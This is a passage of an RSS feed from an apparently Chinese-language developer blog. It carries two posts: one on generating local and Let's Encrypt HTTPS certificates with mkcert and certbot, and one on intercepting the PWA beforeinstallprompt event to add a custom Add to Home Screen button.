&lt;p&gt;Go语言编写，用于生成本地HTTPS证书的工具，官网&lt;a href=&quot;//github.com/FiloSottile/mkcert&quot;&gt;地址&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;11-安装&quot;&gt;1.1. 安装&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Mac方式安装，其他平台见官网&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;brew &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mkcert

&lt;span class=&quot;c&quot;&gt;# 如果用的是firefox还需安装nss&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;brew &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;12-生成&quot;&gt;1.2. 生成&lt;/h3&gt;

&lt;p&gt;根证书生成后会在Mac系统钥匙串应用下的证书项中，存在 &lt;strong&gt;mkcert&lt;/strong&gt; 的已安装的证书&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 生成根证书（只需生成一次）&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkcert &lt;span class=&quot;nt&quot;&gt;-install&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 生成对应域名证书，可生成多个，也支持泛域名&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkcert localhost 127.0.0.1

Created a new certificate valid &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the following names
 - &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;
 - &lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;

The certificate is at &lt;span class=&quot;s2&quot;&gt;&quot;./localhost+2.pem&quot;&lt;/span&gt; and the key at &lt;span class=&quot;s2&quot;&gt;&quot;./localhost+2-key.pem&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;13-使用&quot;&gt;1.3. 使用&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nginx
ssl_certificate     /etc/nginx/ssl/localhost+2.pem;
ssl_certificate_key /etc/nginx/ssl/localhost+2-key.pem;

# jekyll
$ sudo jekyll serve --ssl-cert ./localhost+2.pem --ssl-key ./localhost+2-key.pem --port 443

# http-server
$ http-server -p 443 --ssl --cert ./localhost+2.pem --key ./localhost+2-key.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;移动端使用，IOS使用safari下载 &lt;strong&gt;rootCA.pem&lt;/strong&gt; 并安装，在设置里确认并信任此证书；Android安装比较特殊，可&lt;a href=&quot;//stackoverflow.com/questions/4461360/how-to-install-trusted-ca-certificate-on-android-device/22040887#22040887&quot;&gt;参考&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;2-lets-encrypt&quot;&gt;2. Let’s Encrypt&lt;/h2&gt;

&lt;p&gt;Let’s Encrypt 是由 Mozilla 发起，诸多 CDN 厂商，浏览器厂商共同支持的免费 SSL 项目。Let’s Encrypt 使用一个命令行工具
&lt;a href=&quot;https://certbot.eff.org/&quot;&gt;certbot&lt;/a&gt; 来自动完成 CSR 生成，发起申请，DCV (Domain Control Validation) 验证，获取证
书的工作，基本上一行命令就搞定。&lt;/p&gt;

&lt;h3 id=&quot;21-安装&quot;&gt;2.1. 安装&lt;/h3&gt;

&lt;p&gt;这里以 Debain9 和 nginx 为例子&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;certbot python-certbot-nginx &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; stretch-backports
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;21-使用&quot;&gt;2.1. 使用&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 证书全自动安装&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;certbot &lt;span class=&quot;nt&quot;&gt;--nginx&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 需要有所定制则使用下面命令安装&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;certbot &lt;span class=&quot;nt&quot;&gt;--nginx&lt;/span&gt; certonly
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-续订&quot;&gt;2.2. 续订&lt;/h3&gt;

&lt;p&gt;Let的加密证书持续90天，可以使用计划任务续订证书有效期&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;certbot renew &lt;span class=&quot;nt&quot;&gt;--dry-run&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Tue, 04 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/https-certificate/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/https-certificate/</guid>  
               </item>  
          
            <item>  
               <title>PWA 之拦截 A2HS 实现自主应用添加主屏事件</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-概念&quot; id=&quot;markdown-toc-1-概念&quot;&gt;1. 概念&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-背景&quot; id=&quot;markdown-toc-2-背景&quot;&gt;2. 背景&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-beforeinstallprompt&quot; id=&quot;markdown-toc-3-beforeinstallprompt&quot;&gt;3. beforeinstallprompt&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-demo效果&quot; id=&quot;markdown-toc-4-demo效果&quot;&gt;4. demo效果&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-判断是否安装&quot; id=&quot;markdown-toc-5-判断是否安装&quot;&gt;5. 判断是否安装&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#6-参考链接&quot; id=&quot;markdown-toc-6-参考链接&quot;&gt;6. 参考链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190530/1_hWVmsnBY6Fr6OoNvIU5pmg.png&quot; alt=&quot;pwa-a2hs&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-概念&quot;&gt;1. 概念&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;A2HS&lt;/strong&gt; 是（Add to Home screen）的缩写，也是PWA特性之一，它主要为web应用程序提供与本机应用程序相同的用户体验优势，将PWA应用添加至桌面后，用户可以像打开普通应用程序一样使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190529/a2hs-1.png&quot; alt=&quot;a2hs-1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190529/a2hs-2.png&quot; alt=&quot;a2hs-2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-背景&quot;&gt;2. 背景&lt;/h2&gt;

&lt;p&gt;默认情况下，当编写的web应用满足pwa应用最低要求（manifest.json和service-sworker）时，浏览器会在提示用户可以将当前访问的web安装到桌面上，这个行为是浏览器控制的，用户是否可以不依赖于浏览器，不必每次都弹出 A2HS 的banner，行为由用户控制，如点击按钮提示安装，本文基于此目的编写。&lt;/p&gt;

&lt;h2 id=&quot;3-beforeinstallprompt&quot;&gt;3. beforeinstallprompt&lt;/h2&gt;

&lt;p&gt;要实现上述要求，需要监听 &lt;em&gt;beforeinstallprompt&lt;/em&gt; 事件并进行处理。&lt;/p&gt;

&lt;p&gt;实现代码如下：&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 定义A2HS事件对象&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 监听beforeinstallprompt事件，浏览器触发A2HS时会执行&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'beforeinstallprompt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 阻止自动提示&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 储存事件对象，方便在之后的按钮事件中手动触发&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
 
&lt;span class=&quot;c1&quot;&gt;// UI上的按钮点击事件&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;installBtn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'click'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// 弹出A2HS提示&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 等待用户操作结果&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;userChoice&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;choiceResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;choiceResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outcome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'accepted'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'用户已经接受安装'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'用户已经取消安装'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      
      &lt;span class=&quot;c1&quot;&gt;// 只能用一次&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;4-demo效果&quot;&gt;4. demo效果&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190530/2019-05-30 00.20.10.gif&quot; alt=&quot;demo-a2hs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/wangjunneil/exchange-pwa/tree/master/src/views&quot;&gt;完整的demo代码&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-判断是否安装&quot;&gt;5. 判断是否安装&lt;/h2&gt;

&lt;p&gt;监听安装事件&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'appinstalled'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'installed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若是从主屏幕启动，则可以通过 javascript 判断&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;matchMedia&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(display-mode: standalone)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'display-mode is standalone'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;safari浏览器&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;standalone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'display-mode is standalone'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;这里需要注意的是，上面三个输出只会在 standalone 模式下执行&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;6-参考链接&quot;&gt;6. 参考链接&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Add_to_home_screen&quot;&gt;Add to Home screen&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/BeforeInstallPromptEvent&quot;&gt;Before​Install​Prompt​Event&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.jomendez.com/2018/06/05/add-home-screen-pwas/&quot;&gt;Add to Home Screen your ionic PWA&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>  
               <pubDate>Wed, 29 May 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/05/pwa-handle-install-prompt/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/05/pwa-handle-install-prompt/</guid>  
               </item>  
          
    </channel>  
</rss>
